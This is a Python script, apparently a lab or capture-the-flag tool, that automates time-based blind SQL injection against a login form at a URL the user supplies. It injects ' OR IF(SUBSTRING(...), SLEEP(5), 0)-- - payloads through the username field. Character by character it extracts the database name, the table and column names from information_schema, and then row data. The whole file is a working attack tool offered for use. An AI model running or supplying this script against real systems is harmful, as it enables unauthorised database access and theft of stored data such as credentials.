import requests
import time
import string

text = f"""                                      
                                      %%%% #                                   
                                      % =+++  +                                
                                      %**+# #%##                               
                                      %### %* %%      %@@@#%#                  
                                     *%@%#% %% %   %%#%%#%##%                  
                                     %#%%%*% %#%  %%%#    ##                   
                                     % ##%#%#%@#%%#% %%%  #%                   
                                     # #%%%#%%%%*##%%    %                     
                                 #   ##%#%%%%@# #%##%%##%                      
                                 #   ##%#%%@%%*%#%   %#                        
                              ##% %%%##*%#@%#@# #%#%%                          
                            *@%@@%%@@%@@@@%%%%%#%%                             
                            %%@%@@@@@@@@@@@%#                                  
                        %+  %%%#@@@@@@@@@%%%                                   
                              %@@%@@@@%%@@@%###*                               
                          %%%%%##%@%%% #%# %@%%% #*                            
                       %%%####%#%%#*# %=   # ++%%%%                            
                   ##%*##@#%## ##  *% %%          %%@%                         
                %%%##%%%%%%# ##* ### =@#            %%%@                       
             #%## #*# #%#%  %#%## ##+=@#               %%%%                    
           %%% %%%####% %#%% %##%%%=# #%                 @%#%                  
          #% %#### %+%*%#    ##* #* =%%%                   #@@%                
          %%#% %##%#        * %* %*  %%                       @%%%%            
            ##             * % * %%  %                          %%@@#          
                           # # # # %%                               *          
                           * # % %%%                                           
                           ##%%%%                                    
"""

print('\033[96m' + text + '\033[0m')

banner = f"""
+--------------------------------------------------+
|          Blind SQL Injection Script              |
|                                                  |
|          Author: CyberKRY                        |
|          GitHub: https://github.com/CyberKRY     |
+--------------------------------------------------+
"""
print('\033[1;31m' + banner + '\033[0m')

TARGET_URL = input("Enter target URL (e.g., http://10.10.10.10/login): ") 
DELAY = 5
HEADERS = {
    "Content-Type": "application/x-www-form-urlencoded"
}
MAX_LENGTH = 40

def send_payload(payload):
    data = {
        "username": payload,
        "password": "test"
    }
    start = time.time()
    requests.post(TARGET_URL, data=data, headers=HEADERS)
    end = time.time()
    return (end - start) >= DELAY

def extract_value(sql_query, label=""):
    result = ""
    print(f"[*] Extracting {label}...")

    for i in range(1, MAX_LENGTH):
        found = False
        for c in string.ascii_letters + string.digits + "_@.-{}":
            payload = f"' OR IF(SUBSTRING(({sql_query}),{i},1)='{c}', SLEEP({DELAY}), 0)-- -"
            if send_payload(payload):
                result += c
                print(f"[+] {label}: {result}")
                found = True
                break
        if not found:
            break
    return result

# === 1. DATABASE NAME ===
db_name = extract_value("SELECT database()", label="Database Name")

# === 2. TABLES FROM THIS BASE ===
tables = []
for i in range(0, 5):
    table = extract_value(
        f"SELECT table_name FROM information_schema.tables WHERE table_schema='{db_name}' LIMIT {i},1",
        label=f"Table #{i+1}"
    )
    if table:
        tables.append(table)
    else:
        break

# === 3. RINGS FROM FIRST TABLE (or other) ===
columns = []
target_table = tables[0]
for i in range(0, 5):
    col = extract_value(
        f"SELECT column_name FROM information_schema.columns WHERE table_name='{target_table}' LIMIT {i},1",
        label=f"Column #{i+1}"
    )
    if col:
        columns.append(col)
    else:
        break

# === 4. PULL DATA FROM TABLE ===
for row in range(0, 3):
    row_data = {}
    for col in columns:
        val = extract_value(
            f"SELECT {col} FROM {target_table} LIMIT {row},1",
            label=f"{col} (row {row+1})"
        )
        row_data[col] = val
    print(f"[✔] Row {row + 1}:", row_data)
